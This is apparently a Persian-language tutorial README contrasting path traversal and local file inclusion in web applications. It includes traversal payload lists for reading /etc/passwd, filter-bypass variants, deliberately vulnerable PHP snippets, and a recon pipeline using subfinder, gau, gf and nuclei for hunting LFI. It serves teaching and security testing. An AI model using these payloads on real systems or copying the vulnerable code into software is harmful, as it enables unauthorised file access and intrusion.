# Path-Travel-or-Directory-Traversal-AND-Local-File-Inclusion-LFI-


- آسیب‌پذیری‌های **Path Traversal** (یا **Directory Traversal**) و **Local File Inclusion (LFI)** به هم مربوط هستند، ولی تفاوت‌های مهمی دارند.

## بررسی **Path Traversal:**

### **Path Traversal** (دسترسی به مسیر یا پیمودن دایرکتوری):
- در این نوع آسیب‌پذیری، مهاجم می‌تواند مسیر فایل‌ها را دستکاری کند تا به فایل‌ها یا دایرکتوری‌هایی که خارج از دایرکتوری‌های مجاز هستند دسترسی پیدا کند. مثلا، مهاجم می‌تواند با استفاده از `../` به فایل‌های حساس (مثل `/etc/passwd` در سیستم‌های مبتنی بر Linux) دسترسی پیدا کند. این آسیب‌پذیری فقط امکان دیدن محتوای فایل‌ها را می‌دهد و شامل اجرای آن‌ها نیست.
- چطور پیدا کنیم؟
    - فرض کنید یک URL به این صورت را می‌بینیم:

    ```yaml
    https://target.com/vocational/download.php?filename=wjdncjwnjdekcnwdc.pdf
    ```

    حالا شما می‌آیید با استفاده از `/etc/passwd` شروع می‌کنید به گشتن:

    ```yaml
    https://target.com/vocational/download.php?filename=/etc/passwd
    ```

    حالا که پیدا نشد باید با استفاده از `../` بیایم مراحل زیر را بریم:

    ```yaml
    https://target.com/vocational/download.php?filename=/etc/passwd
    https://target.com/vocational/download.php?filename=../etc/passwd
    https://target.com/vocational/download.php?filename=../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../../../etc/passwd
    Or
    https://target.com/vocational/download.php?filename=....//etc//passwd
    https://target.com/vocational/download.php?filename=....//....//etc/passwd
    https://target.com/vocational/download.php?filename=....//....//....//etc/passwd
    https://target.com/vocational/download.php?filename=....//....//....//....//etc/passwd
    Or
    https://target.com/vocational/download.php?filename=../etc/passwd.pdf
    https://target.com/vocational/download.php?filename=../../../etc/passwd.pdf
    and ...
    ```

### بررسی **Local File Inclusion (LFI)** (گنجاندن فایل محلی):
- در آسیب‌پذیری LFI، مهاجم می‌تواند فایل‌های موجود در سیستم را در چارچوب اجرای برنامه شامل کند. مثلا، اگر ورودی کاربر بدون فیلتر به عنوان مسیر فایل استفاده شود، مهاجم می‌تواند فایل‌های حساس یا حتی فایل‌هایی که کد اجرایی دارند را در برنامه لود کند. این امر می‌تواند به اجرای کد مخرب در سیستم منجر شود.

## **تفاوت و شباهت‌ها:**
- در **Path Traversal** و **LFI** هر دو به دستکاری در مسیر فایل‌ها وابسته هستند، ولی LFI به طور خاص شامل **گنجاندن و احتمالا اجرای فایل‌ها** است، در حالی که Path Traversal فقط برای **دیدن محتوای فایل‌ها** است.
- در **Path Traversal** معمولاً به دیدن محتوای محدود می‌شود، ولی **LFI** می‌تواند به اجرای کد مخرب منجر شود، به خصوص اگر فایل‌های محلی کد اجرایی داشته باشند.

## به طور خلاصه:
- از **Path Traversal**: برای دیدن محتوای فایل‌های حساس استفاده میشه .
- از **LFI**: برای گنجاندن و احتمالا اجرای فایل‌های محلی در چارچوب برنامه که می‌تواند خطرات بیشتری مثل اجرای کد مخرب داشته باشد استفاده میشه . 

## در اینجا مثالی می‌آورم که تفاوت بین **Local File Inclusion (LFI)** و **Path Traversal** را نشان دهد:

### **مثال LFI:**

فرض کنید که یک وب‌سایت پارامتری به نام `file` را دریافت می‌کند که فایل‌های موجود در سرور را در صفحه نمایش می‌دهد. مثلا:

    https://example.com/index.php?file=about.html    



در این کد، ورودی کاربر مستقیماً برای لود کردن فایل استفاده می‌شود:

```yaml
<?php
include($_GET['file']);
?>
```


اگر مهاجم به جای about.html مسیر ../../etc/passwd را وارد کند:

    https://example.com/index.php?file=../../etc/passwd

##### این کد سعی می‌کند فایل /etc/passwd را لود و اجرا کند و محتوای آن را به کاربر نشان دهد. اگر فایل دارای کد PHP باشد، می‌تواند به وسیله سرور اجرا شود و به اجرای کد مخرب منجر شود.



### مثال Path Traversal:

##### در Path Traversal، مهاجم فقط به دنبال مشاهده فایل‌ها است و نه اجرای آن‌ها. برای مثال:
    https://example.com/view-file?path=../../etc/passwd

اگر این پارامتر بدون بررسی استفاده شود:
```
<?php
$file = $_GET['path'];
echo file_get_contents($file);
?>
```

#### در اینجا، فایل /etc/passwd فقط خوانده می‌شود و به خروجی چاپ می‌شود و هیچ عملیاتی روی آن انجام نمی‌شود. Path Traversal امکان دیدن فایل‌های حساس را می‌دهد، ولی نمی‌تواند کد PHP را اجرا کند.
تفاوت اصلی:

#### در LFI فایل مستقیماً توسط برنامه شامل و اجرا می‌شود که امکان اجرای کد مخرب را ایجاد می‌کند.
#### در Path Traversal فایل فقط دیده می‌شود و قابلیت اجرای کد در برنامه وجود ندارد.




-----------


 ## Methodology : 

#### LFI : 
```
subfinder -d target.com | httpx | gau | uro | gf lfi | tee target.txt 

nuclei -list target.txt -tags lfi


```




        /etc/passwd
        ../etc/passwd
        ../../etc/passwd
        ../../../etc/passwd
        ../../../../etc/passwd
        ../../../../../etc/passwd
        ../../../../../../etc/passwd
        ../../../../../../../etc/passwd
        ....//etc//passwd
        ....//....//etc/passwd
        ....//....//....//etc/passwd
        ....//....//....//....//etc/passwd
        ../etc/passwd.pdf
        ../../../etc/passwd.pdf


